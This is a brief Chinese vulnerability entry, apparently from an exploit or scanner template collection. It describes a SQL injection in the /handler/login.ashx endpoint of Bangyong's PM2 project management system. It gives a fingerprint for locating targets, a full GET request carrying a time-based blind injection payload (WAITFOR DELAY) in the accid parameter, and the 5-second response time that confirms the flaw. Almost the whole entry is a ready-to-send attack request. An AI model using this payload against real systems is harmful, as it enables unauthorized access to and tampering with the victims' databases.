# 邦永PM2login.ashx存在SQL注入漏洞

邦永 ｜ SQL注入 ｜ —
- **指纹**：`body="PM2项目管理系统BS版增强工具.zip"`
- **请求**：`GET /handler/login.ashx?n=0.7674954297434442&accid=1001'%20WAITFOR%20DELAY%20'0:0:5'--&loginCode=321&loginPwd=123 HTTP/1.1`
- **响应特征**：200 响应时间>=5s